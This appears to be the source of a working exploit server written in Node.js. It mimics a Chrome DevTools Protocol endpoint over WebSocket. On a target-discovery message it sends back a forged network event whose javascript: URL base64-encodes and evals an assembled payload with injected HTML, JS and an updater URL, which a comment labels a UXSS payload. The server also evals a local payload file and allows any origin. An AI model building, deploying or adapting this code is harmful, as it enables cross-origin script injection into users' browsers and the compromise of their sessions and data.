import { WebSocketServer } from "ws";
import { createServer } from "http";
import * as fs from "fs";

const WebSocket_port = 8000;

const WhalePage = fs.readFileSync("./payloads/index.html");//fs.readFileSync("./static/index.html");

let sessionId = "89AC63D12B18F3EE9808C13899C9B695";

// Reading the server configuration
let serverConfig = '{"updater_url": "SpoobTools.asyncsmasher.com"}';
try {
  serverConfig = fs.readFileSync("server_config.json");
} catch (e) {
  console.log(
    `Using default update url ${
      JSON.parse(serverConfig).updater_url
    } because it failed to read the file: \n${e}`
  );
}

const server = createServer((req, res) => {
  if (
    req.headers.upgrade &&
    req.headers.upgrade.toLowerCase() === "websocket"
  ) {
    return;
  }

  // Serve the custom HTML page for normal HTTP requests
  res.setHeader("Content-Type", "text/html");
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.writeHead(200);
  res.end(WhalePage);
});

// WebSocket server
const wss = new WebSocketServer({ 
  server
});

wss.on("connection", function connection(wss_con) {
  wss_con.on("message", async (msg) => {
    const result = {
      payload1: eval(fs.readFileSync("payload.mjs")),
    };
    let htmlFile = fs
      .readFileSync(new URL("./payloads/index.html", import.meta.url))
      .toString();
    htmlFile.replace("`", "&#96;");
    let jsFile = fs
      .readFileSync(new URL("./payloads/index.js", import.meta.url))
      .toString();
    let { id, method, params } = JSON.parse(msg.toString());
    console.log(id + "> ", method, params);
    const entry = fs.readFileSync("./entry/entry.html");

    if (method === "Target.setDiscoverTargets") {
      wss_con.send(
        JSON.stringify({
          method: "Network.requestWillBeSent",
          params: {
            request: {
              url: `javascript: (function () {eval(atob("${btoa(
                `(${result.payload1
                  .toString()
                  .replace("%%EXTJS%%", btoa(jsFile))
                  .replace("%%EXTHTML%%", btoa(htmlFile))
                  .replace(
                    /%%updaterurl%%/g,
                    JSON.parse(serverConfig).updater_url
                  )
                  .replace("%%HTMLENTRY%%", btoa(entry.toString()))})()`
              )}"))})() /********************************************Built-in payload for uxss*/ `,
            },
          },
        })
      );
    }

    wss_con.send(
      JSON.stringify({
        id: id,
        error: null,
        sessionId: sessionId,
        result: {},
      })
    );
  });
});

server.listen(WebSocket_port, () => {
  console.log(
    `Server running and WebSocket accessible at ws://localhost:${WebSocket_port}`
  );
});